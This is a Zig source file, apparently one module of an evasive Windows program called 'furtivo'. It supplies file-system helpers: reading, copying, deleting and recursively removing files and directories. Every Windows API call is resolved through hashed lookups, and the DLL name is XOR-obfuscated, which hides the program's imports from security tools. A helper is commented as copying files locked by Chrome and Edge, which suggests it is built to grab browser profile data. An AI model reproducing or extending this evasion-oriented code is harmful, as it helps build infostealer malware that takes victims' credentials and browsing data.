const std = @import("std");
const furtivo = @import("furtivo.zig");
const obf = @import("obf.zig");

fn dynFn(comptime T: type, module: []const u8, comptime proc_hash: u32) ?T {
    const h = furtivo.getModuleHandle(module);
    if (h == 0) return null;
    const addr = obf.getProcAddressByHash(h, proc_hash) catch 0;
    if (addr == 0) return null;
    return @as(?T, @ptrFromInt(addr));
}

const CreateFileWFn = *const fn ([*:0]const u16, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.winapi) ?*anyopaque;
const ReadFileFn = *const fn (?*anyopaque, [*]u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
const CloseHandleFn = *const fn (?*anyopaque) callconv(.winapi) i32;
const CopyFileWFn = *const fn ([*:0]const u16, [*:0]const u16, i32) callconv(.winapi) i32;
const DeleteFileWFn = *const fn ([*:0]const u16) callconv(.winapi) i32;
const CreateDirectoryWFn = *const fn ([*:0]const u16, ?*anyopaque) callconv(.winapi) i32;
const GetFileAttributesWFn = *const fn ([*:0]const u16) callconv(.winapi) u32;
const FindFirstFileWFn = *const fn ([*:0]const u16, *anyopaque) callconv(.winapi) ?*anyopaque;
const FindNextFileWFn = *const fn (?*anyopaque, *anyopaque) callconv(.winapi) i32;
const FindCloseFn = *const fn (?*anyopaque) callconv(.winapi) i32;

const k32_name = obf.xorStr("kernel32.dll");

const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;
const FILE_SHARE_ALL: u32 = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;
const OPEN_EXISTING: u32 = 3;
const CREATE_ALWAYS: u32 = 2;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x10;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_FILE_ATTRIBUTES: u32 = 0xFFFFFFFF;

const WIN32_FIND_DATAW = extern struct {
    dwFileAttributes: u32,
    ftCreationTime: [2]u32,
    ftLastAccessTime: [2]u32,
    ftLastWriteTime: [2]u32,
    nFileSizeHigh: u32,
    nFileSizeLow: u32,
    dwReserved0: u32,
    dwReserved1: u32,
    cFileName: [260]u16,
    cAlternateFileName: [14]u16,
};

pub fn pathExists(p: []const u8) bool {
    const GetAttr = dynFn(GetFileAttributesWFn, &k32_name, comptime obf.apiHash("GetFileAttributesW")) orelse return false;
    const w = std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, p) catch return false;
    defer std.heap.page_allocator.free(w);
    const attr = GetAttr(w);
    return attr != INVALID_FILE_ATTRIBUTES;
}

pub fn readFileAlloc(allocator: std.mem.Allocator, p: []const u8, max: usize) ![]u8 {
    const CreateFile = dynFn(CreateFileWFn, &k32_name, comptime obf.apiHash("CreateFileW")) orelse return error.ApiNotFound;
    const ReadFile_ = dynFn(ReadFileFn, &k32_name, comptime obf.apiHash("ReadFile")) orelse return error.ApiNotFound;
    const CloseHandle = dynFn(CloseHandleFn, &k32_name, comptime obf.apiHash("CloseHandle")) orelse return error.ApiNotFound;

    const w = try std.unicode.utf8ToUtf16LeAllocZ(allocator, p);
    defer allocator.free(w);

    const handle = CreateFile(w, GENERIC_READ, FILE_SHARE_ALL, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
    if (handle == @as(?*anyopaque, @ptrFromInt(std.math.maxInt(usize)))) return error.FileOpenFailed;
    defer _ = CloseHandle(handle);

    const buf = try allocator.alloc(u8, max);
    var total: usize = 0;
    while (total < max) {
        var bytes_read: u32 = 0;
        if (ReadFile_(handle, buf.ptr + total, @intCast(max - total), &bytes_read, null) == 0) break;
        if (bytes_read == 0) break;
        total += bytes_read;
    }
    return allocator.realloc(buf, total);
}

pub fn copyFile(src: []const u8, dst: []const u8) !void {
    const CopyFile_ = dynFn(CopyFileWFn, &k32_name, comptime obf.apiHash("CopyFileW")) orelse return error.ApiNotFound;
    const sw = try std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, src);
    defer std.heap.page_allocator.free(sw);
    const dw = try std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, dst);
    defer std.heap.page_allocator.free(dw);
    if (CopyFile_(sw, dw, 0) == 0) return error.CopyFailed;
}

/// Copy a file using CreateFileW with full share mode (READ|WRITE|DELETE).
/// This allows copying files that are locked/open by other processes (Chrome, Edge, etc.).
pub fn copyFileShared(allocator: std.mem.Allocator, src: []const u8, dst: []const u8) !void {
    const CreateFile = dynFn(CreateFileWFn, &k32_name, comptime obf.apiHash("CreateFileW")) orelse return error.ApiNotFound;
    const ReadFile_ = dynFn(ReadFileFn, &k32_name, comptime obf.apiHash("ReadFile")) orelse return error.ApiNotFound;
    const CloseHandle = dynFn(CloseHandleFn, &k32_name, comptime obf.apiHash("CloseHandle")) orelse return error.ApiNotFound;
    const WriteFileFn = *const fn (?*anyopaque, [*]const u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
    const WriteFile_ = dynFn(WriteFileFn, &k32_name, comptime obf.apiHash("WriteFile")) orelse return error.ApiNotFound;

    // Open source with full share mode
    const sw = try std.unicode.utf8ToUtf16LeAllocZ(allocator, src);
    defer allocator.free(sw);
    const src_handle = CreateFile(sw, GENERIC_READ, FILE_SHARE_ALL, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
    if (src_handle == @as(?*anyopaque, @ptrFromInt(std.math.maxInt(usize)))) return error.SourceOpenFailed;
    if (src_handle == null) return error.SourceOpenFailed;
    defer _ = CloseHandle(src_handle);

    // Create destination file
    const dw = try std.unicode.utf8ToUtf16LeAllocZ(allocator, dst);
    defer allocator.free(dw);
    const dst_handle = CreateFile(dw, GENERIC_WRITE, FILE_SHARE_READ, null, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, null);
    if (dst_handle == @as(?*anyopaque, @ptrFromInt(std.math.maxInt(usize)))) return error.DestCreateFailed;
    if (dst_handle == null) return error.DestCreateFailed;
    defer _ = CloseHandle(dst_handle);

    // Copy in chunks
    var buf: [65536]u8 = undefined;
    while (true) {
        var bytes_read: u32 = 0;
        if (ReadFile_(src_handle, &buf, buf.len, &bytes_read, null) == 0) return error.ReadFailed;
        if (bytes_read == 0) break;
        var bytes_written: u32 = 0;
        if (WriteFile_(dst_handle, &buf, bytes_read, &bytes_written, null) == 0) return error.WriteFailed;
        if (bytes_written != bytes_read) return error.WriteIncomplete;
    }
}

pub fn deleteFile(p: []const u8) !void {
    const DeleteFile_ = dynFn(DeleteFileWFn, &k32_name, comptime obf.apiHash("DeleteFileW")) orelse return error.ApiNotFound;
    const w = try std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, p);
    defer std.heap.page_allocator.free(w);
    if (DeleteFile_(w) == 0) return error.DeleteFailed;
}

pub fn makeDir(p: []const u8) !void {
    const CreateDir_ = dynFn(CreateDirectoryWFn, &k32_name, comptime obf.apiHash("CreateDirectoryW")) orelse return error.ApiNotFound;
    const w = try std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, p);
    defer std.heap.page_allocator.free(w);
    _ = CreateDir_(w, null);
}

const RemoveDirectoryWFn = *const fn ([*:0]const u16) callconv(.winapi) i32;
const RemoveDirectoryWHash = obf.apiHash("RemoveDirectoryW");

pub fn removeDir(p: []const u8) !void {
    const RemoveDir_ = dynFn(RemoveDirectoryWFn, &k32_name, RemoveDirectoryWHash) orelse return error.ApiNotFound;
    const w = try std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, p);
    defer std.heap.page_allocator.free(w);
    if (RemoveDir_(w) == 0) return error.RemoveDirFailed;
}

// Recursively remove a directory and all its contents.
pub fn removeDirRecursive(allocator: std.mem.Allocator, dir_path: []const u8) void {
    var dir_iter = DirIter.open(dir_path) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name }) catch continue;
        defer allocator.free(full_path);

        if (entry.is_dir) {
            // Never follow junctions/symlinks: keep the delete inside the tree.
            if (entry.is_reparse_point) continue;
            removeDirRecursive(allocator, full_path);
        } else {
            deleteFile(full_path) catch {};
        }
    }

    // Now remove the empty directory itself
    removeDir(dir_path) catch {};
}

pub const DirIter = struct {
    handle: ?*anyopaque,
    data: WIN32_FIND_DATAW,
    started: bool,

    pub fn open(dir_path: []const u8) ?DirIter {
        const FindFirst = dynFn(FindFirstFileWFn, &k32_name, comptime obf.apiHash("FindFirstFileW")) orelse return null;
        const pattern = std.fmt.allocPrint(std.heap.page_allocator, "{s}\\*", .{dir_path}) catch return null;
        defer std.heap.page_allocator.free(pattern);
        const w = std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, pattern) catch return null;
        defer std.heap.page_allocator.free(w);

        var data: WIN32_FIND_DATAW = undefined;
        const handle = FindFirst(w, &data);
        if (handle == @as(?*anyopaque, @ptrFromInt(std.math.maxInt(usize)))) return null;
        if (handle == null) return null;
        return .{ .handle = handle, .data = data, .started = true };
    }

    pub fn deinit(self: *DirIter) void {
        const FindClose_ = dynFn(FindCloseFn, &k32_name, comptime obf.apiHash("FindClose")) orelse return;
        _ = FindClose_(self.handle);
    }

    pub const Entry = struct {
        name: []const u8,
        is_dir: bool,
        is_reparse_point: bool,
    };

    pub fn next(self: *DirIter, allocator: std.mem.Allocator) ?Entry {
        const FindNext = dynFn(FindNextFileWFn, &k32_name, comptime obf.apiHash("FindNextFileW")) orelse return null;

        while (true) {
            if (!self.started) {
                if (FindNext(self.handle.?, &self.data) == 0) return null;
            }
            self.started = false;

            var name_len: usize = 0;
            while (name_len < self.data.cFileName.len and self.data.cFileName[name_len] != 0) : (name_len += 1) {}
            if (name_len == 1 and self.data.cFileName[0] == '.') continue;
            if (name_len == 2 and self.data.cFileName[0] == '.' and self.data.cFileName[1] == '.') continue;

            const name_u8 = std.unicode.utf16LeToUtf8Alloc(allocator, self.data.cFileName[0..name_len]) catch continue;
            return .{
                .name = name_u8,
                .is_dir = (self.data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0,
                .is_reparse_point = (self.data.dwFileAttributes & 0x400) != 0,
            };
        }
    }
};
